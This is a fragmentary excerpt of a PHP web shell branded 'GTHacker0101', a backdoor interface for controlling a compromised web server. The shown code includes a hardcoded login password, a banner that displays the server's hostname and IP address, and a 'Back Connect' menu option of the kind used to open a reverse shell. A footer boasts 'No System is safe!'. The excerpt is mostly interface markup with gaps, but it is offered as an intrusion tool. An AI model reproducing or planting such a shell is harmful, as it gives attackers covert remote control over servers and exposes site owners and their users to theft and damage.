...
$admin = array();
$admin['check'] = true;
$admin['pass']  = '15121412'; // Password login
$admin['cookiepre'] = '';
$admin['cookiedomain'] = '';
$admin['cookiepath'] = '/';
...
<BR><BR><div align=center><font color=yellow face=tahoma size=2>Hi, GTHacker0101!<img src=http://t3.gstatic.com/images?q=tbn:ANd9GcRFIQy9oLc9jMWmDY_N_sxjWPyusUWC4igwK2lqBm68aDGcSfKPPA></div>');
			exit;
		}
...
<title><?php echo str_replace('.','','.::[  GTHacker0101 ]::.');?></title>
<style type="text/css">
...
<table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#003300"><tr>
<td align="center" valign=center><div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
Loading<img src="http://i382.photobucket.com/albums/oo263/vnhacker/loading.gif"></div></td></tr></table></div>
<script>
 var ld=(document.all);
...
<table width=100%><tr class="head_small"><td  width=86px><a title="VN hacker" href="<?php $self;?>"><img src="http://s16.postimg.org/p4b1u82x1/images.jpg" height=86 border=0></a></td><td>
<span style="float:left;"> <?php echo "Hostname: ".$_SERVER['HTTP_HOST']."";?>  | <a href="http://google.com" target="_blank"><?php echo str_replace('.','','.::[ GTHacker0101 ]::.');?> </a> | <a href="javascript:goaction('logout');"><font color=red>Logout</font></a></span> <br />
<?php
...
?></td></tr></table></td></tr><tr class="alt1"><td  width=10%><span style="float:left;">[Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> - Your IP: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>] </span>   <br />
--------------------------------------------------------------------------------------<br />			
...
<?php if (!IS_WIN) {?> | <a href="javascript:goaction('backconnect');">Back Connect</a><?php }?></td></tr></table>
...
<div style="padding:10px;border-bottom:1px solid #0E0E0E;border-top:1px solid #0E0E0E;background:#0E0E0E;">
	...
	Copyright (C) 2015 <B></B> - Develop by <a href=http://google.com target=_blank><B>GTHacker0101   </B></a> - <B>- No System is safe!</B> All Rights Reserved.
</div>
</body>
</noscript>
